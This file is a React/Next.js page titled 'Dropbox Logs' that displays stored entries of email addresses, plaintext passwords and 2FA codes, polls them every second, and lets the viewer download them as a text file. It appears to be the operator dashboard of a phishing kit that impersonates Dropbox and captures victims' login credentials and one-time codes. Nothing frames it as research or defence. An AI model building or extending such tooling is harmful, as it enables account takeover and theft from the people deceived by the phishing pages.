'use client';

import { useEffect, useState } from 'react';

interface LogEntry {
  timestamp: string;
  email: string;
  password: string;
  code?: string;
  type: 'login' | '2fa';
}

export default function LogsPage() {
  const [logs, setLogs] = useState<LogEntry[]>([]);

  useEffect(() => {
    // Function to load logs from localStorage
    const loadLogs = () => {
      const storedLogs = localStorage.getItem('dropbox_logs');
      if (storedLogs) {
        setLogs(JSON.parse(storedLogs));
      }
    };

    // Load logs initially
    loadLogs();

    // Set up an interval to check for new logs every second
    const interval = setInterval(loadLogs, 1000);

    // Cleanup interval on component unmount
    return () => clearInterval(interval);
  }, []);

  const clearLogs = () => {
    localStorage.removeItem('dropbox_logs');
    setLogs([]);
  };

  const downloadLogs = () => {
    const logText = logs.map(log => {
      let entry = `Timestamp: ${log.timestamp}\nEmail: ${log.email}\nPassword: ${log.password}`;
      if (log.code) {
        entry += `\n2FA Code: ${log.code}`;
      }
      entry += `\nType: ${log.type}\n-------------------\n`;
      return entry;
    }).join('\n');

    const blob = new Blob([logText], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `dropbox_logs_${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="min-h-screen bg-gray-50 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-7xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold text-gray-900">Dropbox Logs</h1>
          <div className="space-x-4">
            <button
              onClick={downloadLogs}
              className="bg-green-600 text-white px-4 py-2 rounded-md hover:bg-green-700 transition-colors"
            >
              Download Logs (.txt)
            </button>
            <button
              onClick={clearLogs}
              className="bg-red-600 text-white px-4 py-2 rounded-md hover:bg-red-700 transition-colors"
            >
              Clear All Logs
            </button>
          </div>
        </div>

        <div className="bg-white shadow overflow-hidden sm:rounded-lg">
          <ul className="divide-y divide-gray-200">
            {logs.map((log, index) => (
              <li key={index} className={`p-4 ${log.type === '2fa' ? 'bg-blue-50' : ''}`}>
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm font-medium text-gray-900">
                      {log.timestamp}
                    </p>
                    <p className="text-sm text-gray-500">
                      Email: {log.email}
                    </p>
                    <p className="text-sm text-gray-500">
                      Password: {log.password}
                    </p>
                    {log.code && (
                      <p className="text-sm text-blue-600 font-medium">
                        2FA Code: {log.code}
                      </p>
                    )}
                  </div>
                  <span className={`px-2 py-1 text-xs font-medium rounded-full ${
                    log.type === '2fa' 
                      ? 'bg-blue-100 text-blue-800' 
                      : 'bg-gray-100 text-gray-800'
                  }`}>
                    {log.type.toUpperCase()}
                  </span>
                </div>
              </li>
            ))}
          </ul>
        </div>
      </div>
    </div>
  );
} 